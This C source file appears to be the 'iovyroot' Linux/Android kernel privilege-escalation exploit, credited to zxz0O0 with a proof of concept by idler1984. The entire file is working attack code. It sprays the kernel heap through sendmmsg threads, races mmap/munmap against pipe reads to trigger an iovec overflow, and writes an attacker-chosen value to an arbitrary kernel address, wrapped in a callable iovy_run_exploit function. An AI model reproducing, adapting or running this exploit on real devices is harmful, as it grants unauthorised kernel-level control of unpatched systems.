#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <netinet/ip.h>

#include <sys/syscall.h>

#include <sys/mman.h>
#include <sys/uio.h>

#include <sys/resource.h>

#include <sys/socket.h>
#include <fcntl.h>
#define F_SETPIPE_SZ (F_LINUX_SPECIFIC_BASE + 7)
struct mmsghdr {
	struct msghdr msg_hdr;
	unsigned int msg_len;
};

#include <stdbool.h>
#include "iovy.h"

#define UDP_SERVER_PORT (5105)
#define MEMMAGIC (0xDEADBEEF)
//pipe buffers are seperated in pages
#define PIPESZ (4096 * 32)
#define IOVECS (512)
#define SENDTHREADS (1000)
#define MMAP_ADDR ((void*)0x40000000)
#define MMAP_SIZE (PAGE_SIZE * 2)

static volatile int kill_switch = 0;
static volatile int stop_send = 0;
static int pipefd[2];
static struct iovec iovs[IOVECS];
static volatile unsigned long overflowcheck = MEMMAGIC;

static void* readpipe(void* param)
{
	while(!kill_switch)
	{
		readv((int)((long)param), iovs, ((IOVECS / 2) + 1));
	}

	pthread_exit(NULL);
}

static int startreadpipe()
{
	int ret;
	pthread_t rthread;

	printf("    [+] Start read thread\n");
	if((ret = pthread_create(&rthread, NULL, readpipe, (void*)(long)pipefd[0])))
		perror("read pthread_create()");

	return ret;
}

static char wbuf[4096];
static void* writepipe(void* param)
{
	while(!kill_switch)
	{
		if(write((int)((long)param), wbuf, sizeof(wbuf)) != sizeof(wbuf))
			perror("write()");
	}

	pthread_exit(NULL);
}

static int startwritepipe(long targetval)
{
	int ret;
	unsigned int i;
	pthread_t wthread;

	printf("    [+] Start write thread\n");

	for(i = 0; i < (sizeof(wbuf) / sizeof(targetval)); i++)
		((long*)wbuf)[i] = targetval;
	if((ret = pthread_create(&wthread, NULL, writepipe, (void*)(long)pipefd[1])))
		perror("write pthread_create()");

	return ret;
}

static void* writemsg(void* param)
{
	int sockfd;
	struct mmsghdr msg = {{ 0 }, 0 };
	struct sockaddr_in soaddr = { 0 };

	(void)param; /* UNUSED */
	soaddr.sin_family = AF_INET;
	soaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	soaddr.sin_port = htons(UDP_SERVER_PORT);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1)
	{
		perror("socket client failed");
		pthread_exit((void*)-1);
	}

	if (connect(sockfd, (struct sockaddr *)&soaddr, sizeof(soaddr)) == -1)
	{
		perror("connect failed");
		pthread_exit((void*)-1);
	}

	msg.msg_hdr.msg_iov = iovs;
	msg.msg_hdr.msg_iovlen = IOVECS;
	msg.msg_hdr.msg_control = iovs;
	msg.msg_hdr.msg_controllen = (IOVECS * sizeof(struct iovec));

	while(!stop_send)
	{
		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
	}

	close(sockfd);
	pthread_exit(NULL);
}

static int heapspray(long* target)
{
	unsigned int i;
	void* retval;
	pthread_t msgthreads[SENDTHREADS];

	printf("    [+] Spraying kernel heap\n");

	iovs[(IOVECS / 2) + 1].iov_base = (void*)&overflowcheck;
	iovs[(IOVECS / 2) + 1].iov_len = sizeof(overflowcheck);
	iovs[(IOVECS / 2) + 2].iov_base = target;
	iovs[(IOVECS / 2) + 2].iov_len = sizeof(*target);

	for(i = 0; i < SENDTHREADS; i++)
	{
		if(pthread_create(&msgthreads[i], NULL, writemsg, NULL))
		{
			perror("heapspray pthread_create()");
			return 1;
		}
	}

	sleep(2);
	stop_send = 1;
	for(i = 0; i < SENDTHREADS; i++)
		pthread_join(msgthreads[i], &retval);
	stop_send = 0;

	return 0;
}

static void* mapunmap(void* param)
{
	(void)param; /* UNUSED */
	while(!kill_switch)
	{
		munmap(MMAP_ADDR, MMAP_SIZE);
		if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
		{
			perror("mmap() thread");
			exit(2);
		}
		usleep(50);
	}

	pthread_exit(NULL);
}

static int startmapunmap()
{
	int ret;
	pthread_t mapthread;

	printf("    [+] Start map/unmap thread\n");
	if((ret = pthread_create(&mapthread, NULL, mapunmap, NULL)))
		perror("mapunmap pthread_create()");

	return ret;
}

static int initmappings()
{
	memset(iovs, 0, sizeof(iovs));
	printf("[+] Allocating memory\n");

	if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1)
	{
		perror("mmap()");
		return -ENOMEM;
	}

	//just any buffer that is always available
	iovs[0].iov_base = &wbuf;
	//how many bytes we can arbitrary write
	iovs[0].iov_len = sizeof(long) * 2;

	iovs[1].iov_base = MMAP_ADDR;
	//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes)
	iovs[1].iov_len = ((PAGE_SIZE * 2) - iovs[0].iov_len);

	return 0;
}

static int getpipes()
{
	int ret;
	printf("[+] Getting pipes\n");
	if((ret = pipe(pipefd)))
	{
		perror("pipe()");
		return ret;
	}

	ret = (fcntl(pipefd[1], F_SETPIPE_SZ, PIPESZ) == PIPESZ) ? 0 : 1;
	if(ret)
		perror("fcntl()");

	return ret;
}

static int setfdlimit()
{
	struct rlimit rlim;
	int ret;
	if ((ret = getrlimit(RLIMIT_NOFILE, &rlim)))
	{
		perror("getrlimit()");
		return ret;
	}

	printf("[+] Changing fd limit from %lu to %lu\n", rlim.rlim_cur, rlim.rlim_max);
	rlim.rlim_cur = rlim.rlim_max;
	if((ret = setrlimit(RLIMIT_NOFILE, &rlim)))
		perror("setrlimit()");

	return ret;
}

static int setprocesspriority()
{
	int ret;
	printf("[+] Changing process priority to highest\n");
	if((ret = setpriority(PRIO_PROCESS, 0, -20)) == -1)
		perror("setpriority()");
	return ret;
}

static int write_at_address(void* target, unsigned long targetval)
{
	kill_switch = 0;
	overflowcheck = MEMMAGIC;

	printf("    [+] Patching address %p\n", target);
	if(startmapunmap())
		return 1;
	if(startwritepipe(targetval))
		return 1;
	if(heapspray(target))
		return 1;

	sleep(1);

	if(startreadpipe())
		return 1;

	while(1)
	{
		if(overflowcheck != MEMMAGIC)
		{
			kill_switch = 1;
			printf("    [+] Done\n");
			break;
		}
	}

	return 0;
}

bool iovy_run_exploit(unsigned long address, int value,
	bool(*exploit_callback)(void* user_data), void *user_data)
{
	printf("iovyroot by zxz0O0\n");
	printf("poc by idler1984\n\n");

	if(setfdlimit())
		return false;
	if(setprocesspriority())
		return false;
	if(getpipes())
		return false;
	if(initmappings())
		return false;

	write_at_address(address, value);
	//let the threads end
	sleep(1);

	close(pipefd[0]);
	close(pipefd[1]);

	return exploit_callback(user_data);
}
